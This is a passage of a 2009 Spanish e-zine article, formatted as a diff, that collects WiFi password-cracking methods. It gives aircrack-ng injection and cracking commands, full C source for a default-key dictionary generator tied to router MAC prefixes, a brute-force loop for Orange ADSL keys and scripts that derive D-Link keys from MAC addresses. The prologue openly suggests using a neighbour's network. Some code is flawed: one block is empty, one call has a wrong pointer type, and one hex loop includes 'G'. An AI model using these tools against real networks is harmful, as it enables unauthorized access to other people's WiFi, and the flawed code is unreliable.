@@ -1,0 +1,1978 @@
+-[ 0x0B ]--------------------------------------------------------------------
+-[ Cracking Wifi al Completo ]-----------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-36--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+ 1 - Prologo
+ 2 - Introduccion
+ 3 - Romper WEP
+    3.1 - Ataque Basico
+    3.2 - Ataque a WLAN_XX
+    3.3 - Ataque a R-WLANXX
+    3.4 - Ataque a ADSLXXXX
+    3.5 - Ataque a JAZZTEL_XX
+    3.6 - Ataque a DLINKWIRELESS
+    3.7 - Ataque a ONO (P123456789)
+ 4 - Romper WPA (no de momento pero...)
+    4.1 - Ataque a TELE2
+    4.2 - Ataque a SPEEDTOUCH
+    4.3 - Que pasa con LIVEBOX?
+ 5 - Evadir ESSID ocultos
+ 6 - Suplantacion de MAC
+ 7 - Espionaje Offline
+ 8 - ERW o WifiSlax
+ 9 - Conclusion
+ 10 - Referencias
+
+
+
+---[ 1 - Prologo
+
+Hola chic@s. Podria entrar en avisos, advertencias y cualquier otro tipo de
+discurso acerca de la utilidad que dareis a esta informacion; pero ya todos
+sabemos como funciona esto, asi que...
+
+... que mostraremos aqui?
+
+Deseas comprobar si la red WiFi que tienes montada en tu casa es realmente
+segura? En tu escuela saben que eres un hacha en esto de la informatica y te
+han pedido que realices una auditoria de su red inalambrica? O simplemente
+no puedes costearte una conexion ADSL puesto que tus recursos son limitados
+y tienes la suerte de tener a tu alcance la red wireless que tu vecino ha
+instalado hace apenas unos meses?
+
+Cualquiera que sea tu situacion, el objetivo de este articulo es la recopilacion
+de todos los metodos conocidos hasta la actualidad para conseguir descubrir la
+contrasena de todas aquellas redes wifi que puedes alcanzar con tu tarjeta
+inalambrica.
+
+Si lo que haces es legal o no, es responsabilidad tuya.
+
+
+
+---[ 2 - Introduccion
+
+Que tiene este articulo que lo diferencia con cualquier otro que puedas
+encontrar en la red?
+
+Facil. Casi todos los articulos o resenyas que puedas encontrar a lo largo de
+internet solo se suelen centrar en un metodo para hacer cierta tarea y casi
+siempre se resume a lo siguiente:
+
+   1 - Utiliza "airodump(-ng)" para capturar paquetes.
+   2 - Utiliza "aircrack(-ng)" para romper la clave.
+
+Quizas con un posible:
+
+   * - Utiliza "aireplay(-ng)" para inyectar paquetes.
+
+Pero que pasa cuando te encuentras en una situacion en que no todo sale como
+deberia? Cuando una red apenas produce paquetes, cuando no tiene clientes
+conectados o un sin fin de inconvenientes que limitan tus armas...
+
+Pues aqui te mostraremos diversas formas de seguir consiguiendo contrasenyas
+aun a pesar de enfrentarte a todas estas dificultades.
+
+Aun para mas, aqui reuniremos todo aquello que se puede encontrar en los foros
+mas dispersos de la telaranya global, a la vez que incluiremos directamente el
+codigo fuente de aquellas aplicaciones o scripts que haran la mayoria del
+trabajo sucio por ti (ya sean ajenas o creadas por nosotros), y agregaremos
+todos los links necesarios a cualquier otra herramienta que sea mencionada.
+
+Lo que no explicaremos aqui es el funcionamento de las redes wireless, ni como
+funcionan sus algoritmos criptograficos. Aunque posiblemente referenciaremos a
+documentos que aborden ampliamente estos temas u otros que son considerados de
+caracter general.
+
+Este articulo se centra sobre el sistema operativo Linux, aunque haremos
+referencias en su momento al resto. Normalmente todos los programas o scripts
+aqui presentados, salvo contadas excepciones, pueden ser ejecutados en ambos
+sistemas. Recuerda que un ejecutable de windows puede correr bajo Linux por
+medio de "Wine".
+
+
+
+---[ 3 - Romper WEP
+
+A modo de breve resumen explicaremos porque el protocolo WEP para cifrado
+en redes WiFi resulta vulnerable.
+
+Tras la puerta de este protocolo, realmente quien se encuentra es otro mucho
+mas conocido llamado: "RC4". Que resulta ser un algoritmo de cifrado de flujo.
+
+Para que nos entendamos, podriamos decir que RC4 convierte una contrasenya
+cualquiera en una tirada de bits pseudoaleatorios mucho mas larga que la
+original. Esta cadena puede ser utilizada posteriormente para aplicarse al
+texto plano en el proceso de cifrado real.
+
+Pero WEP pretendia implantar una medida adicional de seguridad. Y para ello
+utilizo lo que muchos conocemos como IV's (Vectores de Inicializacion). En
+realidad no es mas que una cadena de 24 bits que se anyade a la clave antes
+de pasar por RC4.
+
+En resumen WEP realiza lo siguiente (extraido de la referencia que se cita
+al final de seccion):
+
+   1 - Se calcula un CRC de 32 bits de los datos. Este CRC-32 es el metodo
+       que propone WEP para garantizar la integridad de los mensajes
+       (ICV, Integrity Check Value).
+
+   2 - Se concatena la clave secreta a continuacion del IV formado el seed.
+
+   3 - El PRNG (Pseudo-Random Number Generator) de RC4 genera una secuencia
+       de caracteres pseudoaleatorios (keystream), a partir del seed, de la
+       misma longitud que los bits obtenidos en el punto 1.
+
+   4 - Se calcula la O exclusiva (XOR) de los caracteres del punto 1 con los
+       del punto 3. El resultado es el mensaje cifrado.
+
+   5 - Se envia el IV (sin cifrar) y el mensaje cifrado dentro del campo de
+       datos (frame body) de la trama IEEE 802.11
+
+El problema radica en estos dos puntos:
+
+   1 - La ridicula longitud del IV (24 bits)
+   2 - La pesima implementacion de los fabricantes a la hora
+       de aplicar aleatoriedad a estos Vectores de Inicializacion.
+
+La cuestion es que, aun desconociendo la clave, los IV's se repiten en
+multitud de ocasiones, provocando que distintos textos planos se cifren
+multitud de veces con el mismo "seed" (casi igual que decir que se
+cifra con la misma clave).
+
+Si se consigue una cantidad de textos cifrados considerable en los que se
+repita el Vector de Inicializacion, entonces podrian iniciarse ataques
+estadisticos para deducir el texto en claro. Pero resulta que gracias a la
+aplicacion del XOR, existe una propiedad que dice que se se puede obtener
+el "seed" aplicado a un texto cifrado, realizando el XOR entre un texto
+plano y un texto cifrado con este mismo "seed".
+
+Entonces el problema se reduce a encontrar un texto plano cifrado con la
+misma cadena. Y es mas sencillo de lo que parece, porque existen traficos
+predecibles o bien, podemos provocarlos nosotros (mensajes ICMP de solicitud
+y respuesta de eco, confirmaciones de TCP, etc.).
+
+Con todo esto es posible ya descifrar trafico generado por una red que utilice
+en protocolo WEP como metodo de seguridad. Pero este metodo no es suficiente
+para obtener la clave. Para ello se han descubierto otras vulnerabilidades
+implicitas en el protocolo RC4 que facilitan esta tarea.
+
+Y aqui no se queda la cosa... Pero para mas informacion mejor consulten en
+este lugar [1].
+
+
+--------------
+|AIRCRACK-PTW|
+--------------
+
+Tal cual se anuncio en Kriptopolis y otros lugares en su momento:
+
+   "Investigadores alemanes han anunciado un nuevo ataque que reduciria a una
+    decima parte el volumen de trafico cifrado WEP necesario para crackear la
+    clave utilizada en una comunicacion inalambrica."
+
+En la practica, el anuncio viene a significar que las comunicaciones WEP a
+128 bit podrian ser crackeadas en menos de un minuto utilizando un equipo
+informatico comun..."
+
+La herramienta "aircrack-ptw" fue creada por los mismos investigadores como
+prueba de concepto para esta vulnerabilidad, aunque hoy en dia la ultima
+version de "aircrack-ng" ya implementa este ataque (si bien puede ser
+desactivado a peticion en la linea de comandos)
+
+
+[-----]
+
+
+Por ultimo recordar que existen muchas otras herramientas que nos permiten
+capturar trafico. Algunas de ellas tienen nombres tan conocidos como:
+
+   - Wireshark (ethereal)
+   - AirSnort
+   - Kismet
+
+Lo que ocurre es que la suite "Aircrack(-ng)" esta especialmente dise�ada
+para dedicarse a una unica tarea. Y es por ello que nos hace la vida mucho
+mas facil.
+
+
+
+---[ 3.1 - Ataque Basico
+
+Como ya he dicho en la introduccion, este tema ya es mas que sabido por todos.
+Por ello no me centrare mas que en los 3 o 4 pasos basicos que se deben dar
+para crackear una red wireless estandar sin mas complicaciones:
+
+   1 - Poner a correr airodump(-ng) normalmente para ver todas las redes que
+       encontramos a nuestro alcance:
+
+       $ airodump-ng --write captura --ivs interfaz
+
+   2 - Cuando nos hayamos decidido por una red en concreto y tengamos el canal
+       sobre el que opera:
+
+       $ airodump-ng --write red_elegida --channel X --ivs interfaz
+
+   Ahora esperamos a que el campo DATA de la red elegida comience a subir hasta
+   alcanzar como minimo una cantidad de 250.000 para redes con claves de 64 bits
+   o cerca de 1.000.000 para redes de 128 bits.
+
+   A tener en cuenta:
+
+      1 -> Para el resto de redes que se presentan en este articulo
+           normalmente deberas suprimir el parametro "--ivs" para
+           que el archivo tenga formato "*.cap" y pueda ser interpretado
+           correctamente por los programas adecuados.
+
+      2 -> Si deseas que en pantalla solo aparezca la red sobre la que
+           te centras puedes especificar el parametro "--bssid" seguido
+           de la direccion MAC del punto de acceso.
+
+      3 -> La cantidad de paquetes ivs que precisas puede variar mucho
+           dependiendo de la red con la que estes tratando. Recuerda que
+           siempre puedes ir probando el archivo de capturas con "aircrack(-ng)"
+           sin necesidad de parar el proceso "airodump(-ng)".
+
+   3 - Ejecutar un ataque de inyeccion de paquetes para aumentar el trafico:
+
+       $ aireplay-ng -3 -b MAC AP -h MAC CLIENTE
+
+   Como puedes ver, para ejecutar este ataque necesitas que en la parte inferior
+   del "airodump(-ng)" se muestre un cliente autorizado conectado a la red.
+   Recuerda tambien que este paso es opcional pero hoy en dia casi imprescindible
+   si no queremos perder horas crackeando una red.
+
+   4 - Lanzar "aircrack(-ng)" en la busqueda de la clave correcta:
+
+       $ aircrack-ng captura.ivs
+
+   Te pedira que eligas la red en caso de que haya capturado paquetes de varias
+   y se pondra directamente a hacer sus calculos internos para proporcionarte
+   la clave correcta.
+
+   Si tienes pistas acerca de si se trata de una contrasenya compuesta por solo
+   numeros o solo caracteres alfanumericos, etc... no te olvides de utilizar los
+   parametros "-h" o "-t". Podrian ahorrarte muchisimo tiempo.
+
+Y no tiene mas miga. Por el resto puedes seguir jugando con los parametros de
+cada una de las aplicaciones, algunos de ellos te muestran la contrasenya en
+formato "ASCII" (muy util si deseas ver las suposiciones que va haciendo
+aircrack(-ng) acerca de la clave) y otros te permiten variar ciertos indices
+de fuerza bruta o ataques "korek" especiales.
+
+
+
+---[ 3.2 - Ataque a WLAN_XX
+
+Investigando las wifi WLAN_XX, una tal "nilp0inter" publico en un foro que
+habia descubierto que las claves por defecto de este tipo de redes eran
+practicamente comunes segun que marca de router fuese utilizado.
+
+Todos los routers wireless de una misma marca utilizaban una misma raiz para
+sus contrasenyas. A continuacion venian 4 digitos hexadecimales cualesquiera
+seguido de los dos ultimos digitos que componian el nombre de la WLAN.
+
+Los fabricantes que se habian estudiado eran los siguientes:
+
+   o----------------------------------o
+   [   MARCA   ]....[ RAIZ CONTRASE~A ]
+   o----------------------------------o
+   |   Z-com      -> Z001349          |
+   |   Zyxel      -> Z001349          |
+   |   P-660HW-D1 -> Z001349          |
+   |   Xavvy      -> X000138          |
+   |   Comtrend   -> C0030DA          |
+   |   Zygate     -> Z0002CF o C0030DA|
+   o----------------------------------o
+
+De todos es sabido ya que los 3 primeros pares de una direccion MAC indica
+cual es el fabricante del router o de una tarjeta inalambrica. Con esto ya
+podemos saber que raiz de clave corresponde a una MAC.
+
+Entonces, caso de encontrar una red, por ejemplo:
+
+   ESSID: WLAN_AB
+   MAC:   00:60:B3:04:F1:ED
+
+Sabemos que la MAC es de un router de la marca 'Z-com' y que la clave por
+defecto para esa red sera algo como:
+
+   Z001349XXXXAB
+
+Para conseguir la contrasenya completa, el problema se basa en aplicar la
+fuerza bruta para crear un diccionario con todas las posibles claves que
+vayan:
+
+   Desde Z0013490000AB hasta Z001349FFFFAB
+
+Y nilp0inter, tan amablemente, se dispuso a crear un programa en C que
+hiciera estas operaciones de una forma eficaz. Eso fue haya por el 2006.
+Aqui teneis una referencia al programa [2] tal cual lo hizo su autor con
+el cual me he comunicado y ha afirmado que remitiria mis sugerencias a
+los actuales mantenedores del programa que el abandono hace ya un tiempo. 
+
+A dia de hoy yo me he permitido modificar el programa en ciertos aspectos
+para hacerlo mas eficiente. El algoritmo principal utilizaba 4 bucles 'for(;;)'
+para introducir los cuatro digitos hexadecimales aleatorios. Yo lo he
+sustituido por un unico bucle que va desde '0' a '65535', que pasado a
+hexadecimal resulta ser 'FFFF'. Utilizo el modificador '%04X' para completar
+con 0s cuando haga falta y la X mayuscula para que las letras salgan de este
+modo.
+
+Tambien he hecho algunos cambios en algun metodo y en ciertas comprobaciones.
+
+El programa puede ejecutarse de dos maneras:
+
+   1º - $ ./wlandecrypter <BSSID> <ESSID> -> Salida por pantalla
+   2º - $ ./wlandecrypter <BSSID> <ESSID> [FICHERO] -> Crea diccionario
+
+La primera forma es muy util para utilizarla en combinacion con el programa
+"Weplab" [3], que sera el encargado de contrastar cada una de las posibles
+claves con un archivo de captura que debera contener al menos 4 paquetes en
+formato "*.cap".
+
+Este podria ser un ejemplo de ejecucion:
+
+   $ wlandecrypter 00:60:B3:04:F1:ED WLAN_AB | weplab --key 128 -y
+     --bssid 00:60:B3:04:F1:ED captura_wlan.cap
+
+El programa WepAttack [4] tambien sirve para este proposito. Y podrias arrancarlo
+de este modo:
+
+   $ wlandecrypter 00:60:B3:04:F1:ED WLAN_AB | wepattack -f captura_wlan.cap
+
+He aqui el codigo fuente creado por nilp0inter y modificado por mi:
+
+ **--------------------------------------------------------------------------**
+
+/*****************************************************************************
+* Fichero:                      wlandecrypter.c
+* Fecha:                        23-03-2006
+* Autor:                        Nilp0inteR (nilp0inter2k6[at]gmail[dot]com)
+* Actualizado:                  22-11-2006
+* Modicado:                     06-11-2008 blackngel (black@set-ezine.org)
+*
+* Descripcion: Generador de diccionario de claves por defecto para los 
+* router de Timofonik Zyxel, Xavvy y Comtrend.
+*
+* Este programa es software libre; puedes redistribuirlo y/o modificarlo
+* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
+* por la Free Software Foundation; en su version numero 2, o (bajo tu 
+* criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt.
+* 
+* Este programa se distribuye SIN GARANTIA de ningun tipo.
+*
+*****************************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAXROUTER 8
+#define MAXINDEX 1
+#define VERSION 0
+#define SUBVERSION 5
+
+typedef struct Router
+{
+   char bssid[9];
+   char init[MAXINDEX][8];
+   char notas[30];
+} tRouter;
+
+char hex[16] = "0123456789ABCDEF";
+
+void toUpperString(char *);
+void initRouters(tRouter []);
+void datosRouters(tRouter []);
+void muestraAyuda(void);
+int buscaBssid(tRouter [], char *);
+void imprimeClaves(FILE *, tRouter [], int, char *);
+
+int main(int argc, char *argv[])
+{
+   int bssidId, i;
+   int validHex=0;
+   char endKey[2];
+   tRouter routers[MAXROUTER];
+   FILE *fichero;
+
+   if (argc < 3 || argc > 4) {
+      muestraAyuda();
+      return 1;
+   }
+
+fprintf(stderr, "\nwlandecrypter %i.%i - (c) 2006 nilp0inter2k6_at_gmail.com\n", 
+                                                           VERSION, SUBVERSION);
+fprintf(stderr, "------------>  http://www.rusoblanco.com  <------------\n\n");
+
+   if (strlen(argv[1]) != 17) {
+      fprintf(stderr," [-] Longitud de BSSID invalida\n");
+      return 1;
+   }
+
+   initRouters(routers);
+   datosRouters(routers);
+
+   bssidId = buscaBssid(routers, argv[1]);
+
+   if (bssidId == -1) {
+      fprintf(stderr, " [-] BSSID no encontrado\n");
+      return 1;
+   }
+   else {
+      fprintf(stderr, " [+] BSSID: %s\n" 
+                      " [+] Modelo: %s\n", argv[1], routers[bssidId].notas);
+
+      toUpperString(&argv[2]);
+
+      if (strlen(argv[2]) < 7 || strlen(argv[2]) > 9 ||
+                                strncmp("WLAN_", argv[2], 5) != 0 ) {
+         fprintf(stderr, " [-] ESSID: %s invalido!!\n", argv[2]);
+         return 1;
+      }
+      else {
+         for (i = 0; i < 16; i++) {
+            if (argv[2][5] == hex[i])
+               validHex++;
+            if (argv[2][6] == hex[i])
+               validHex++;
+         }
+
+         if (validHex != 2) {
+            fprintf(stderr, " [-] ESSID: %s invalido!!\n", argv[2]);
+            return 1;
+         }
+         else {
+            endKey[0]=argv[2][5];
+            endKey[1]=argv[2][6];
+
+            fprintf(stderr," [+] ESSID: %s\n", argv[2]);
+
+            if (argc > 3) {
+               fprintf(stderr," [+] Fichero de claves: %s\n", argv[3]);
+               fichero = fopen(argv[3], "a+");
+               if (fichero != NULL) {
+               imprimeClaves(fichero,routers,bssidId,endKey);
+               fclose(fichero);
+               fprintf(stderr, " [+] Fichero guardado\n");
+            }
+            else {
+               fprintf(stderr, " [-] Error al abrir el fichero\n");
+               return 1;
+            }
+         }
+         else {
+            fprintf(stderr," [+] Seleccionada salida estandar\n");
+            imprimeClaves(stdout, routers, bssidId, endKey);
+         }
+      }
+   }
+
+   return 0;
+}
+	
+void toUpperString(char *s)
+{
+   while (*s) {
+      *s = toupper(*s);
+      s++;
+   }
+}
+
+void initRouters(tRouter routers[MAXROUTER])
+{
+   int i, j;
+
+   for (j = 0; j < MAXROUTER; j++) {
+      strcpy(routers[j].bssid, "");
+      for (i = 0; i < MAXINDEX; i++)
+         strcpy(routers[j].init[i], "");
+      strcpy(routers[j].notas, "");
+   }
+}
+
+void datosRouters(tRouter routers[MAXROUTER])
+{
+   // Z-com
+   strcpy(routers[0].bssid, "00:60:B3\0");
+   strcpy(routers[0].init[0], "Z001349\0");
+   strcpy(routers[0].notas, "Z-com\0");
+
+   // Xavvy
+   strcpy(routers[1].bssid, "00:01:38\0");
+   strcpy(routers[1].init[0], "X000138\0");
+   strcpy(routers[1].notas, "Xavi 7768r\0");
+
+   // Comtrend
+   strcpy(routers[2].bssid, "00:03:C9\0");
+   strcpy(routers[2].init[0], "C0030DA\0");
+   strcpy(routers[2].notas, "Comtrend 535\0");
+
+   // Zyxel : Gracias a thefkboss de foro.elhacker.net por esta observacion
+   strcpy(routers[3].bssid, "00:A0:C5\0"); 
+   strcpy(routers[3].init[0], "Z001349\0");
+   strcpy(routers[3].notas, "Zyxel 650HW/660HW\0");
+
+   // Comtrend NUEVO, gracias a dnreinad por el coche xD
+   strcpy(routers[4].bssid, "00:16:38\0");
+   strcpy(routers[4].init[0], "C0030DA\0");
+   strcpy(routers[4].notas, "Comtrend 536+\0");
+	
+   // P-660HW-D1
+   strcpy(routers[5].bssid, "00:13:49\0");
+   strcpy(routers[5].init[0], "Z001349\0");
+   strcpy(routers[5].notas, "P-660HW-D1\0");
+
+   // ZyGate
+   strcpy(routers[6].bssid, "00:02:CF\0");
+   strcpy(routers[6].init[0], "Z0002CF\0");
+   strcpy(routers[6].notas, "ZyGate\0");
+
+   // ZyGate
+   strcpy(routers[7].bssid, "00:19:15\0");
+   strcpy(routers[7].init[0], "C0030DA\0");
+   strcpy(routers[7].notas, "Comtrend\0");
+}
+
+void muestraAyuda()
+{
+fprintf(stderr, "\nwlandecrypter %i.%i - (c) 2006 nilp0inter2k6_at_gmail.com\n",
+                                                           VERSION, SUBVERSION);
+fprintf(stderr, "------------>  http://www.rusoblanco.com  <------------\n\n");
+fprintf(stderr, "  uso: wlandecrypter <bssid> <essid> [output file]\n\n");
+}
+
+int buscaBssid(tRouter routers[MAXROUTER], char *bssid)
+{
+   int i;
+
+   toUpperString(&bssid);
+
+   for(i = 0; i < MAXROUTER; i++) {
+      if (strncmp(routers[i].bssid, bssid, 8) == 0)
+      return i;
+   }
+	
+   return -1;
+}
+
+void imprimeClaves(FILE *out, tRouter routers[MAXROUTER], int bId, char *keyEnd)
+{
+   int i, index=0;
+
+   while(index < MAXINDEX && strcmp(routers[bId].init[index], "")) {
+      for (i = 0; i < 65536; i++)
+         fprintf(out, "%s%04X%c%c\n", routers[bId].init[index],
+                                      i, keyEnd[0], keyEnd[1]);
+      index++;
+   }
+}
+
+ **--------------------------------------------------------------------------**
+
+Tal como se presenta, el codigo es facil de comprender incluso para un
+programador novato.
+
+En resumen, el proceso siempre es el mismo:
+
+   1 -> Capturar cuatro paquetes con airodump(-ng) en formato "*.cap".
+   2 -> Generar el diccionario para la MAC y ESSID deseados con wlandecrypter.
+   3 -> Pasarle este diccionario a Weplab o WepAttack.
+
+La clave por defecto se obtiene en cuestion de segundos.
+
+
+
+---[ 3.3 - Ataque a R-WLANXX
+
+Para este tipo de redes, presentes solo en Galicia, basta con aplicar de forma
+pura y dura la fuerza bruta. Sus claves por defecto suelen ser 6 digitos
+decimales aleatorios seguidos de 7 ceros que rellenan los 13 caracteres tipicos
+de una contrasenya de 128 bits.
+
+Podemos crear un programa que recoja en un diccionario todas las posibles
+claves de una forma tan sencilla como la siguiente:
+
+ **--------------------------------------------------------------------------**
+
+
+
+ **--------------------------------------------------------------------------**
+
+En otros lugares se ha dicho que la clave se compone de 8 digitos cualesquiera
+seguido de 5 ceros hasta completar los 13. Para crear un diccionario de este
+tipo solo habria que agregar al programa anterior esto:
+
+
+Tambien hay quien dice que los primeros 4 digitos de la clave se corresponde
+con el anyo de fabricacion del router o con el numero del cliente asignado
+quedando las claves con una estructura de este tipo:
+
+   2001XXXX00000
+   2002XXXX00000
+   ....XXXX00000
+   ....XXXX00000
+   2008XXXX00000
+   2009XXXX00000
+
+No obstante, no es extremadamente costoso hacer una lista con todas las posibles
+combinaciones y probar esta contra un archivo de captura con 4 IV's, con un
+comando como este:
+
+   $ aircrack-ng -b BSSID -w lista_numeros.txt fichero.cap
+
+Si, por aquello de probar, quisieras crear un diccionario que abarcara desde el
+anyo 2001 hasta el 2009 inclusive, podrias utiliar este sencillo script:
+
+   o------------------------------o
+   | #!/bin/bash                  |
+   |                              |
+   | INICIO=2009999900000         |
+   | FIN=2001000000000            |
+   |                              |
+   | until ((INICIO==FIN))        |
+   | do                           |
+   |    echo $INICIO >> $1        |
+   |    let INICIO=$INICIO-100000 |
+   | done                         |
+   | echo 1000000000000 >> $1     |
+   o------------------------------o
+
+El numero de claves posibles se reduciria bastante, y el tiempo de crackeo lo
+haria en la misma proporcion.
+
+
+
+---[ 3.4 - Ataque a ADSLXXXX
+
+La raiz del problema para las redes Wireless de Orange viene dado por el motivo
+siguiente:
+
+Algunas redes WiFi utilizan palabras de paso o "passphrases" para generar claves
+WEP estaticas. El administrador del router inserta en la pantalla de instalacion
+este passphrase y el software especifico de este configura automaticamente la
+clave WEP apropiada por defecto.
+
+Esto simplifica el proceso de instalacion, porque las palabras de paso son mas
+faciles de recordar que la clave WEP generada en si.
+
+Hay situaciones en que este metodo no puede ser utilizado:
+
+   1 -> No todo el hardware Wifi lo soporta.
+   2 -> Cuando en la red se mezclan equipos de diferentes fabricantes.
+
+Pero este no es el caso, y la empresa Orange utiliza este metodo para generar
+las claves por defecto para sus routers.
+
+La situacion es la siguiente:
+
+   1 - El ESSID de estas redes siempre tiene el aspecto 'ADSLXXXX'
+       donde las cuatro X son siempre digitos aleatorios.
+
+   2 - La passphrase tiene el aspecto yyyyXXXX, donde las X coinciden
+       con las del ESSID y las 'y' son siempre letras en minuscula.
+
+   3 - El metodo para crear la clave WEP a partir del passphrase es
+       aplicarle al mismo el algoritmo MD5. Lo que nos da la WEP en
+       hexadecimal.
+
+Con esto es facil crear un diccionario con todas las posibles contrasenyas para
+estas redes. Imaginate lo siguiente:
+
+   1 - Tenemos una red llamada ADSL1234.
+
+   2 - Las passphrases iran desde 'aaaa1234' hasta 'zzzz1234'.
+
+   3 - A cada una le aplicamos MD5 y guardamos el resultado en
+       un fichero que hara de diccionario contra una captura,
+       como siempre, de al menos 4 paquetes.
+
+De la mano de 'ska1ix' se creo un programa, llamado DecSagem [5], que cumple
+dos funciones:
+
+   1 -> Crea un diccionario con todas las posibles claves.
+
+   2 -> Una vez obtenida la clave WEP puede utilizarse para obtener
+        la passphrase si se le pasa la anterior como parametro.
+
+Su uso es tal que asi:
+
+   $ decsagem [-i] <numeroSSID> <clave>
+
+Donde <numeroSSID> son las cuatro cifras que acompanyan en el ESSID al
+nombre 'ADSL'. Y <clave> es la WEP key que obtendremos al pasar el diccionario
+resultante por aircrack(-ng) (que nos permitira entrar en la red) y que nos
+da la posibilidad, opcionalmente, de conseguir el passphrase correspondiente.
+
+El algoritmo principal, recortando el codigo, seria algo como esto:
+
+ **--------------------------------------------------------------------------**
+
+   for (i = 'a'; i <= 'z'; i++) {
+
+      for (j = 'a'; j <= 'z'; j++) {
+
+         for (k = 'a'; k <= 'z'; k++) {
+
+            for (l = 'a'; l <= 'z'; l++) {
+
+               /* Inicializamos todos los strings como vacíos */						
+               passphrase[0] = '\0';
+               passmd5[0] = '\0';
+               signature[0] = '\0';
+
+               /* En las primeras posiciones del passphrase van las letras */
+               passphrase[0] = i;
+               passphrase[1] = j;
+               passphrase[2] = k;
+               passphrase[3] = l;
+
+               /* Finalizamos el string para concatenar correctamente */
+               passphrase[4] = '\0';					
+               strcat(passphrase, ssid);
+
+               /* Repetimos 8 veces la clave, para poder pasarla al MD5 */		
+               for (rep = 0; rep < 8; rep++) {
+                  strcat(passmd5, passphrase);
+               }
+
+               /* Aplicamos MD5 para obtener una posible clave WEP */
+               MD5Init(&md5c);
+               MD5Update(&md5c, (unsigned char *) (passmd5), 64);
+               MD5Final(signature, &md5c);
+
+               /* Imprimimos los pares hexadecimales en formato correcto */
+               for (rep = 0; rep < 12; rep++) {
+                  fprintf(file_wri, "%02X:", signature[rep]);
+               }
+
+               /* Ultimo par para no agregar un ':' al final */
+               fprintf(file_wri, "%02X", signature[12]);						
+               fprintf(file_wri, "\n");
+            }
+         }
+      }
+   }
+
+ **--------------------------------------------------------------------------**
+
+Las funciones MD5 vienen incluidas en el codigo fuente del mismo programa.
+
+
+
+---[ 3.5 - Ataque a JAZZTEL_XX
+
+Mas adelante se descubrio que las redes cuyo ESSID radicaba como en el titulo
+de esta seccion, seguian la misma logica que las redes 'WLAN_XX'. De hecho, en
+un principio, detras de todas estas wifi esta siempre un router de esta clase:
+
+   Marca      -> Comtrend
+   Raiz MAC   -> 00:1A:2B
+   Raiz Clave -> E001D20
+
+Y entonces llego nilp0inter y creo otro programa llamado "jazzteldecrypter" que
+venia a crear el diccionario con todas las claves posibles para esta clase de
+redes. Programa que no escribire aqui, por la siemple razon de que es una copia
+exacta del "wlandecrypter" ya creado, al que se le ha anyadido en la lista de
+routers la siguiente entrada:
+
+   // Comtrend
+   strcpy(routers[i].bssid, "00:1A:2B\0");
+   strcpy(routers[i].init[0], "E001D20\0");
+   strcpy(routers[i].notas, "Comtrend\0");
+
+Claro que a la constante MAXROUTER definida al principio del codigo habria que
+sumarle una unidad para que el programa funcionse correctamente.
+
+
+
+---[ 3.6 - Ataque a DLINKWIRELESS
+
+Estas redes suelen encontrarse bastante a menudo, y siguiendo con los colmos de
+las grandes ideas que tienen las empresas a la hora de proteger a sus clientes,
+pues aqui tenemos otra mas, y de las gordas.
+
+Las ultra-mega-secretas claves de aquellas wifi's que poseen este ESSID son una
+recomposicion (recombinacion) de los pares de bytes que forman la MAC del router.
+Es decir, un cambio de posiciones.
+
+La llave maestra es la siguiente:
+
+   -> 6152346523413
+
+Explicacion:
+
+   1º - Obtenemos la MAC del router: 00:1F:3C:16:A7:9F
+
+      1 -> 00
+      2 -> 1F
+      3 -> 3C
+      4 -> 16
+      5 -> A7
+      6 -> 9F
+
+   2º - Aplicamos la llave maestra:
+
+      P6 P1 P5 P2 P3 P4 P6 P5 P2 P3 P4 P1 P3
+      -- -- -- -- -- -- -- -- -- -- -- -- --        
+      9F 00 A7 1F 3C 16 9F A7 1F 3C 16 00 9F
+
+   3º - Todo junto:
+
+      9F00A71F3C169FA71F3C16009F
+
+Bien, llegados a este punto se hizo un sencillo script (por parte de un tal
+"pianista") que te realizaba los cambios de posiciones automaticamente:
+
+ **--------------------------------------------------------------------------**
+
+   #!/bin/bash
+   P1=`echo $1|cut -d : -f 1`
+   P2=`echo $1|cut -d : -f 2`
+   P3=`echo $1|cut -d : -f 3`
+   P4=`echo $1|cut -d : -f 4`
+   P5=`echo $1|cut -d : -f 5`
+   P6=`echo $1|cut -d : -f 6`
+
+   echo $P6$P1$P5$P2$P3$P4$P6$P5$P2$P3$P4$P1$P3
+
+ **--------------------------------------------------------------------------**
+
+Pero segun parece no era oro todo lo que relucia. En los foros se vieron
+comentarios de gente que afirmaba coincidir con esta solucion, con la unica
+diferencia de que al ultimo par hexadecimal habia que restarle una unidad.
+
+Y esto merece una explicacion:
+
+La realidad es, que cuando realizamos una captura de paquetes, podemos observar
+normalmente el BSSID, que viene a ser la MAC del AP (punto de acceso) y la MAC
+del "router" que, normalmente, siempre coincide con la del AP. Es por este motivo
+que creemos que estamos viendo la misma direccion.
+
+Puede darse la situacion de que esto no sea asi, y esto es lo que ha ocurrido.
+En algunos casos las dos MAC's se diferencian en una unidad, y entonces es la
+MAC del router la que tenemos que tomar y no la otra.
+
+De todos modos, probar dos claves no es mucho trabajo para una persona normal
+y corriente. No obstante, nuestro amigo "pianista" decidio hacer el trabajo a
+lo "bruto" modificando el script anterior para que creara un diccionario con
+todas las posibles claves. Es decir, ordenar todos los pares menos el ultimo
+y anyadirle a cada clave un par exadecimal desde '01' hasta 'FF' para poder
+utilizar este diccionario con la opcion "-w" del aircrack(-ng), despues de
+haber capturado al menos 4 paquetes con el airodump(-ng).
+
+ **--------------------------------------------------------------------------**
+
+   #!/bin/bash
+   P1=`echo $1|cut -d : -f 1`
+   P2=`echo $1|cut -d : -f 2`
+   P3=`echo $1|cut -d : -f 3`
+   P4=`echo $1|cut -d : -f 4`
+   P5=`echo $1|cut -d : -f 5`
+   P6=`echo $1|cut -d : -f 6`
+
+   for f in 1 2 3 4 5 6 7 8 9 A B C D E F G 
+   do
+   for t in 1 2 3 4 5 6 7 8 9 A B C D E F G
+   do
+
+   echo $P6$P1$P5$P2$P3$P4$P6$P5$P2$P3$P4$P1$f$t >> diccionariodlink
+
+   done
+   done
+
+ **--------------------------------------------------------------------------**
+
+Yo he automatizado la tarea en lenguaje C. El programa toma como primer parametro
+la direccion MAC del punto de acceso y como segundo el nombre del diccionario que
